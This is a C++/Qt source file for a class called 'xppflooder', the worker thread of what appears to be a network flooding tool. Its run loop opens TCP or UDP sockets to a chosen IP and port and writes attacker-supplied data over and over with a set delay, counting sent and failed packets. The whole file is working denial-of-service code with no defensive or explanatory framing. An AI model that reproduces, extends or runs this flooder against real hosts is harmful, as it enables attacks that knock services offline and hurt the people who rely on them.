#include "xppflooder.h"


xppflooder::xppflooder(QString ip, quint32 port, QString protocol, quint32 delay, quint32 timeout, bool resp, QString data)
{
	active = true;
	IP = ip;
	Port = port;
	Timeout = timeout;
	Protocol = protocol;
	Delay = delay;
	Response = resp;
	Data = data;
	FloodCount = 0;
	Failed = 0;
}

//
// Run the packet generator thread;
// Commence writing data to sockets
//
void xppflooder::run()
{
	while (active) {
		if (Protocol == "TCP") {

 			QHostAddress *addr = new QHostAddress(IP);
			QTcpSocket *Socket = new QTcpSocket;
			Socket->connectToHost(IP, Port);

			if (!Socket->waitForConnected(Timeout)) {
				Failed++;
				Socket->close();
				delete addr;
				delete Socket;
				continue;
          		  }

			while (active) {
				qint64 errcode = 0;
				do {
					FloodCount++;
   					errcode = Socket->write(Data.toUtf8());
					Socket->flush();
					this->msleep(Delay);
				} while ((errcode != -1) && (active));
				// if you write to a socket for some time, it appears to become unusable
				Failed++;
				break;
			}
			Socket->close();
 			delete addr;
			delete Socket;

		} else if (Protocol == "UDP") {

 			QHostAddress *addr = new QHostAddress(IP);
			QUdpSocket *Socket = new QUdpSocket;
			Socket->connectToHost(IP, Port);

			while (active) {
				FloodCount++;
       				Socket->writeDatagram(Data.toUtf8(), *addr, Port);
				Socket->flush();
				this->msleep(Delay);
			}
			Socket->close();
 			delete addr;
			delete Socket;
			
		}
	}
	active = true;
}

//
// Set the thread's state to inactive
//
void xppflooder::stop()
{
	active = false;
}

   